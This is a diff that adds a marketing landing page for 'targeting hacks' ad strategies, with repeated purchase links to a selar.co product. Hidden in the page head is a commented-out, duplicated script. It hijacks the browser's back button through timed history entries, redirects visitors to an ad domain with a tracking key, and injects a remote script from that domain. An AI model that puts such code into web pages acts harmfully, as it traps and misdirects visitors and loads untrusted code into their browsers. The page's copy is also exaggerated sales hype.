@@ -1,0 +1,403 @@
+
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Express Marketing - targeting hacks</title>
+
+    <link
+    rel="stylesheet"
+    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css"
+  />
+
+    <style>
+      header {
+        background-color: #fff;
+        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+      }
+
+      nav {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        padding: 10px 20px;
+      }
+
+      .logo a {
+        text-decoration: none;
+        color: #21f3be;
+        font-size: 24px;
+        font-weight: bold;
+        font-style: oblique;
+      }
+
+      nav ul {
+        list-style: none;
+        display: flex;
+        gap: 20px;
+      }
+
+      nav ul li a {
+        text-decoration: none;
+        color: #000;
+        font-weight: 600;
+      }
+
+      .cta-button {
+        background-color: #21f3be;
+        color: black;
+        border: none;
+        padding: 10px 20px;
+        cursor: pointer;
+        border-radius: 4px;
+        font-size: 16px;
+        border: none;
+      }
+
+      main {
+        padding: 20px;
+      }
+      body {
+        background-color: #f8f8f8;
+        text-align: center;
+        font-family: Arial, sans-serif;
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+      .container {
+        max-width: 600px;
+        margin: 0 auto;
+        background-color: #ffffff;
+        padding: 30px;
+        border-radius: 8px;
+        box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+      }
+      h1 {
+        color: #333333;
+      }
+      p {
+        color: #666666;
+        font-size: 18px;
+        line-height: 1.6;
+        margin-bottom: 20px;
+      }
+      .action-button {
+        display: inline-block;
+        padding: 12px 30px;
+        background-color: #21f3be;
+        color: black;
+        font-size: 18px;
+        text-decoration: none;
+        border-radius: 5px;
+        transition: background-color 0.3s ease;
+        margin-top: 10px;
+      }
+      
+      .action-button:hover {
+        background-color: black;
+      }
+      @media (max-width: 768px) {
+        .container {
+          padding: 20px;
+        }
+        p {
+          font-size: 16px;
+        }
+        .action-button {
+          font-size: 16px;
+          padding: 10px 20px;
+        }
+      }
+      @media (max-width: 480px) {
+        .container {
+          padding: 15px;
+        }
+        h1 {
+          font-size: 24px;
+        }
+        p {
+          font-size: 14px;
+        }
+        .action-button {
+          font-size: 14px;
+          padding: 8px 16px;
+        }
+      }
+
+      @media (max-width: 768px) {
+        nav ul {
+          display: none;
+        }
+
+        nav .mobile-icons {
+          display: flex;
+          gap: 20px;
+        }
+
+        .case-study {
+          display: none;
+        }
+
+        .promo-cards {
+          overflow-x: auto;
+          display: flex;
+        }
+
+        .promo-cards::-webkit-scrollbar {
+          display: none;
+        }
+      }
+
+      @media (max-width: 480px) {
+        nav {
+          flex-direction: column;
+          align-items: flex-start;
+        }
+
+        .cta-button {
+          width: 100%;
+          text-align: center;
+        }
+
+        .case-content h1 {
+          font-size: 24px;
+        }
+
+        .case-content p {
+          font-size: 16px;
+        }
+
+        .case-content img {
+          width: 80px;
+          height: 80px;
+        }
+
+        .case-image img {
+          width: 100px;
+        }
+
+        .footer-container {
+          flex-direction: column;
+          align-items: center;
+        }
+
+        .footer-section {
+          text-align: center;
+        }
+      }
+
+      .action-button {
+        animation: pulse 1s infinite;
+      }
+      @keyframes action-button {
+        0% {
+          transform: scale(1);
+        }
+        50% {
+          transform: scale(1.1);
+        }
+        100% {
+          transform: scale(1);
+        }
+      }
+
+      .custom-bottom-nav {
+            position: fixed;
+            color: black;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            background-color: #21f3be;
+            box-shadow: 0 -2px 5px rgba(0, 0, 0, 0.1);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 10px 0;
+            text-decoration: none;
+            font-size: 24px;
+            font-weight: bolder;
+            border-color: black;
+            border-style: outset;
+            border-bottom: none;
+          }
+    
+          .custom-nav-item {
+            margin: 0 10px;
+            text-decoration: none;
+            font-size: 24px;
+          }
+    
+          .custom-nav-item .fab {
+            transition: color 0.3s ease;
+          }
+    
+          .custom-nav-item .fa-twitter {
+            color: #1da1f2;
+          }
+    
+          .custom-nav-item .fa-facebook {
+            color: #1877f2;
+          }
+    
+          .custom-nav-item .fa-pinterest {
+            color: #e60023;
+          }
+    
+          .custom-nav-item .fa-linkedin {
+            color: #0077b5;
+          }
+    
+          .custom-nav-item .fa-rss {
+            color: #ffa500;
+          }
+    
+          .custom-nav-item:hover .fab {
+            color: #000;
+          }
+    
+          .custom-share-count {
+            margin-left: 20px;
+            font-size: 16px;
+            color: #555;
+          }
+    </style>
+
+      <!-- 
+    <script>
+      window.onhashchange = function () {
+        jp();
+      };
+      function hh() {
+        history.pushState(
+          history.length + 1,
+          "message",
+          "#" + new Date().getTime()
+        );
+      }
+      function jp() {
+        fh();
+      }
+      setTimeout("hh();", 500);
+      function fh() {
+        location.href =
+          "https://offensiveparkedangela.com/pqx0f3djek?key=449e4026712ac25a3fe474b18fa1cb53";
+      }
+      function goon() {
+        location.href =
+          "https://offensiveparkedangela.com/pqx0f3djek?key=449e4026712ac25a3fe474b18fa1cb53";
+      }
+
+      window.onhashchange = function () {
+        jp();
+      };
+      function hh() {
+        history.pushState(
+          history.length + 1,
+          "message",
+          "#" + new Date().getTime()
+        );
+      }
+      function jp() {
+        fh();
+      }
+      setTimeout("hh();", 500);
+      function fh() {
+        location.href =
+          "https://offensiveparkedangela.com/pqx0f3djek?key=449e4026712ac25a3fe474b18fa1cb53";
+      }
+      function goon() {
+        location.href =
+          "https://offensiveparkedangela.com/pqx0f3djek?key=449e4026712ac25a3fe474b18fa1cb53";
+      }
+
+      var _hmt = _hmt || [];
+      (function () {
+        var hm = document.createElement("script");
+        hm.src =
+          "https://offensiveparkedangela.com/pqx0f3djek?key=449e4026712ac25a3fe474b18fa1cb53";
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(hm, s);
+      })();
+    </script>
+
+     -->
+
+  </head>
+
+  <body>
+    <header>
+      <nav>
+        <div class="logo">
+          <a href="#">Express Marketing</a>
+        </div>
+        <!-- 
+        <ul>
+          <li><a href="#">Love❤️</a></li>
+          <li><a href="#">Monetize</a></li>
+          <li><a href="#">Boost Skills</a></li>
+          <li><a href="#">Resources</a></li>
+        </ul>
+      <!--  <button class="cta-button">Explore stories</button> -->
+      </nav>
+    </header>
+    <div class="container">
+      <h1>Unlock the Secrets to Low-Cost Results!</h1>
+      <p>
+        Bullet Points:
+        <br />
+        
+        
+
+        1.🔥 Reduce Cost Per Result: Achieve massive profits with cutting-edge targeting strategies.
+        <br />
+
+        2.👥 Optimize Ad Spend: Drive higher conversions at the lowest cost.
+        <br />
+        <br>
+
+      3.✅ 600+ Targeting Options: Detailed strategies for all niches to supercharge your campaigns.
+      <br />
+
+        4.🤑 Customize Your Campaign: Build unique and effective campaigns with our targeted ad builder.
+      </p>
+      <button class="cta-button">
+      <a style="color: whitesmoke; text-decoration: none;" onclick=window.open('https://selar.co/121s22');
+      href="https://selar.co/121s22"
+      >Get Started Now!</a>
+      </button>
+    </div>
+ <br />
+ 
+
+ <a class="custom-bottom-nav" href="https://selar.co/121s22">Uncover targeting hack</a>
+
+ <a href="https://selar.co/121s22" target="_blank" class="custom-nav-item"
+><i class="fab fa-twitter"></i
+></a>
+<a href="https://selar.co/121s22" target="_blank" class="custom-nav-item"
+><i class="fab fa-facebook"></i
+></a>
+<a href="https://selar.co/121s22" target="_blank" class="custom-nav-item"
+><i class="fab fa-pinterest"></i
+></a>
+<a href="https://selar.co/121s22" target="_blank" class="custom-nav-item"
+><i class="fab fa-linkedin"></i
+></a>
+<a href="https://selar.co/121s22" target="_blank" class="custom-nav-item"
+><i class="fas fa-rss"></i
+></a>
+
+<br />
+ <br />
+ <br />
+
+<br />
+<br />
+<br />
+
+  </body>
+</html>
+
+
